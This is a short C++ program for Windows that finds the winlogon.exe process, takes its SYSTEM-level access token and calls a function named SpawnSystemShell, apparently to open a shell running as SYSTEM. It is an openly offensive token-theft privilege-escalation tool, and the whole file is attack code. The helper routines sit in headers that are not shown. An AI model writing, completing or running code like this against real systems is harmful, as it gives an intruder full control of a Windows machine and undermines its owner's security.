#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include "Proc.h"
#include "MExec.h"


int main()
{
    //this process runs as NT\SystemAuthority
    const char* procName = "winlogon.exe";
    DWORD pid = 0;

    while (!pid)
    {
        pid = GetProcId(procName);
    }

    std::cout << "[*] " << procName << " has PID: " << pid << std::endl;

    //Get a pointer to the Token from the process
    HANDLE token = GetToken(pid);
    SpawnSystemShell(token, pid);
    return 0;
}